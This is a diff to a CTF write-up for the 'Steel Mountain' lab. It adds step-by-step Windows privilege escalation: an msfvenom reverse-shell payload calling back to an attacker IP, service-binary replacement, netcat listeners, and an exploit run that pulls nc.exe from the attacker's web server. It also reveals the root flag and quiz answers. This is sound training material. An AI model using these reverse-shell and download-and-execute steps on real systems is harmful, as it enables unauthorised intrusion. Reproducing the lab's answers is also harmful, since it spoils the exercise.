@@ -101,36 +101,109 @@ This guide contains the answer and steps necessary to get to them for the [Steel
 
 3. The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program! Use msfvenom to generate a reverse shell as an Windows executable. `msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe` Upload your binary and replace the legitimate one. Then restart the program to get a shell as root. Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
 
-   
+   First thing we will do is create our payload with `msfvenom`.
 
-   ><details><summary>Click for answer</summary></details>
+   ```console
+   msfvenom -p windows/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
+   ```
+
+   ESCALATE PAYLOAD
+
+   Using the same method as before, we upload the payload to the machine with metasploit.
+
+   ```console
+   upload ASCService.exe
+   ```
+
+   ESCALATE UPLOAD PAYLOAD
+
+   Now we must first stop the service so we can overwrite the executable for it. From the PowerUp script we found the service name we must use.
+
+   ```console
+   sc stop AdvancedSystemCareService9
+   sc query AdvancedSystemCareService9
+   ```
+
+   Now copy the "ASCService.exe" payload we created to the folder of the service and overwrite the existing.
+
+   ESCALATE OVERWRITE EXECUTABLE
+
+   Before we start the service, we must setup a listener with `netcat`.
+
+   ```console
+   nc -nlvp 1337
+   ```
+
+   Now we can start the service using:
+
+   ```console
+   sc start AdvancedSystemCareService9
+   sc query AdvancedSystemCareService9
+   ```
+
+   ESCALATE START SERVICE
+
+   Eventhough the service didn't start (which makes sense as the executabel only contains our reverse shell), we did receive a connection in our listener!
+
+   ESCALATE ROOT SHELL
 
 4. What is the root flag?
 
+   Now that we have root access to the system, we can navigate to our flag in the Administrator folder. After some digging we find the file on the Desktop.
 
+   ESCALATE ROOT FLAG
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>9af5f314f57607c00fd09803a587db80</details>
 
 ### Access and Escalation Without Metasploit
 
-1. To begin we shall be using the sameCVE. However, this time let's use thisexploit.*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it fromGitHub!You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
+1. To begin we shall be using the same CVE. However, this time let's use thisexploit. *Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!* To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub! You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
 
+   First we download both the script as well as a netcat binary for windows. We rename the binary to `nc.exe` and put it in our current directory.
 
+   The we must modify the script to our needs.
 
-   ><details><summary>Click for answer</summary></details>
+   - Change the ip and port to your attack machine.
+   - I had to replace `import urllib2` with `import urllib.request as urllib2`, because of an error with urllib2.
+   - I also had to add parenthesis to the final print command as I got and error there as well.
+   
+   MANUAL SCRIPT
 
-2. Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.Once
- we run winPeas, we see that it points us towards unquoted paths. We can
- see that it provides us with the name of the service it is also 
-running.What powershell -c command could we run to manually find out the service name?*Format is "powershell -c "command here"*
+   If you get an error like below, you must add an `r` to line 37 above.
 
+   MANUAL ERROR
 
+   Make sure to setup a listener with:
 
-   ><details><summary>Click for answer</summary></details>
+   ```console
+   nc -nlvp 1338
+   ```
+
+   And a webserver on port 80 (which is what the script uses).
+
+   ```console
+   python3 -m http.server 80
+   ```
+
+   After all this is done, we can run the exploit with the target ip and port number.
+
+   MANUAL EXPLOIT
+
+   After the first run, we can see our netcat binary was uploaded to the machine.
+
+   MANUAL SERVER
+
+   After the second run, we can see we received an connection on our listener.
+
+   MANUAL SHELL
+
+   The remaining steps the get a root shell are similar as before.
+
+2. Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c. Once we run winPeas, we see that it points us towards unquoted paths. We can
+ see that it provides us with the name of the service it is also running. What powershell -c command could we run to manually find out the service name? *Format is "powershell -c "command here"*
+
+   Looking up which command to use in Powershell to view all active services on Windows, gives us the answer we are after.
+
+   ><details><summary>Click for answer</summary>powershell -c "Get-Service"</details>
 
 3. Now let's escalate to Administrator with our new found knowledge.Generate your payload using msfvenom and pull it to the system using powershell.Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.First we need to stop the service which we can do like so;sc stop AdvancedSystemCareService9Shortly followed by;sc start AdvancedSystemCareService9Once this command runs, you will see you gain a shell as Administrator on our listener!
-
-
-
-   ><details><summary>Click for answer</summary></details>
-
